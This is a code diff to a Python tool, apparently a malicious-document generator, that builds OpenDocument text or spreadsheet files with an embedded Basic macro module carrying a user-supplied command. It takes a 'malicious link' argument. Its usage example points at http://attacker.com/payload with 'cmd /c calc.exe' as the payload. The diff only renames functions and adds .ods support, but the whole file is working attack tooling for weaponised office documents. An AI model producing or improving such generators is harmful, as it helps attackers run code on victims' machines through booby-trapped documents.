@@ -30,7 +30,7 @@ End Sub
 
 
 
-def generate_odt(output_filename, link, payload):
+def generate_od(output_filename, link, payload):
     content_xml_file = "content.xml"
     manifest_xml_file = "manifest.xml"
     script_lb_xml_file = "script-lb.xml"
@@ -39,7 +39,7 @@ def generate_odt(output_filename, link, payload):
     try:
         # Create a new ODT file (which is a ZIP archive)
         target_ip=link.split('/')[2].split(':')[0]
-        with zipfile.ZipFile(output_filename, 'w', zipfile.ZIP_DEFLATED) as odt:
+        with zipfile.ZipFile(output_filename, 'w', zipfile.ZIP_DEFLATED) as od:
             # Parse and modify content.xml
             content_xml = etree.parse(content_xml_file)
             root = content_xml.getroot()
@@ -70,15 +70,21 @@ def generate_odt(output_filename, link, payload):
             modified_content = etree.tostring(content_xml, encoding='utf-8', xml_declaration=True, pretty_print=True)
 
             # Add required ODT files
-            odt.writestr('mimetype', 'application/vnd.oasis.opendocument.text', 
+            if output_filename.endswith('.odt'):
+                od.writestr('mimetype', 'application/vnd.oasis.opendocument.text', 
                         compress_type=zipfile.ZIP_STORED)
+            elif output_filename.endswith('.ods'):
+                od.writestr('mimetype', 'application/vnd.oasis.opendocument.spreadsheet', 
+                        compress_type=zipfile.ZIP_STORED)
+            else:
+                raise ValueError("Output filename must end with .odt or .ods")
             
             # Add modified content.xml to ODT
-            odt.writestr('Basic/Standard/Module1.xml', generate_macro_xml(payload), compress_type=zipfile.ZIP_DEFLATED)
-            odt.writestr('Basic/Standard/script-lb.xml', open(script_lb_xml_file, 'r').read(), compress_type=zipfile.ZIP_DEFLATED)
-            odt.writestr('Basic/script-lc.xml', open(script_lc_xml_file, 'r').read(), compress_type=zipfile.ZIP_DEFLATED)
-            odt.writestr('content.xml', modified_content, compress_type=zipfile.ZIP_DEFLATED)
-            odt.writestr("META-INF/manifest.xml", open(manifest_xml_file, 'r').read(), compress_type=zipfile.ZIP_DEFLATED)
+            od.writestr('Basic/Standard/Module1.xml', generate_macro_xml(payload), compress_type=zipfile.ZIP_DEFLATED)
+            od.writestr('Basic/Standard/script-lb.xml', open(script_lb_xml_file, 'r').read(), compress_type=zipfile.ZIP_DEFLATED)
+            od.writestr('Basic/script-lc.xml', open(script_lc_xml_file, 'r').read(), compress_type=zipfile.ZIP_DEFLATED)
+            od.writestr('content.xml', modified_content, compress_type=zipfile.ZIP_DEFLATED)
+            od.writestr("META-INF/manifest.xml", open(manifest_xml_file, 'r').read(), compress_type=zipfile.ZIP_DEFLATED)
 
         print(f"Successfully created {output_filename}")
             
@@ -89,11 +95,11 @@ def generate_odt(output_filename, link, payload):
 
 if __name__ == "__main__":
     if len(sys.argv) < 3 :
-        print("Usage: python generate_odt.py <output.odt> <link> <payload>")
-        print("Example: python generate_odt.py crafted.odt http://attacker.com/payload 'cmd /c calc.exe'")
+        print("Usage: python generate_od.py <output.odt> <link> <payload>")
+        print("Example: python generate_od.py crafted.odt http://attacker.com/payload 'cmd /c calc.exe'")
         sys.exit(1)
     
     output_file = sys.argv[1]
     malicious_link = sys.argv[2]
     macro_payload = sys.argv[3]
-    generate_odt(output_file, malicious_link, macro_payload)
+    generate_od(output_file, malicious_link, macro_payload)
